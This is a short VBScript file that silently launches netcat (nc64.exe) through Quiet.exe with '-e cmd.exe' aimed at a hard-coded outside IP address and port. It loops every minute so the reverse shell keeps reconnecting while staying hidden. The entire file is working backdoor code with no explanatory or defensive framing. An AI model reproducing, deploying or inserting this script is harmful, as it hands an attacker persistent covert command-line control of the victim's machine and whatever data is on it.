Set objShell = CreateObject("WScript.Shell")

' Get the path to the user's custom folder
customFolder = objShell.ExpandEnvironmentStrings("%USERPROFILE%\MyCustomFolder")

' Define the command to run from the custom folder
commandToRun = """" & customFolder & "\Quiet.exe"" """ & customFolder & "\nc64.exe"" -e cmd.exe 206.189.80.59 22812"

' Loop indefinitely
Do
    ' Run the command
    objShell.Run commandToRun, 0, True
    
    ' Wait for 1 minute (60,000 milliseconds)
    WScript.Sleep 60000
Loop
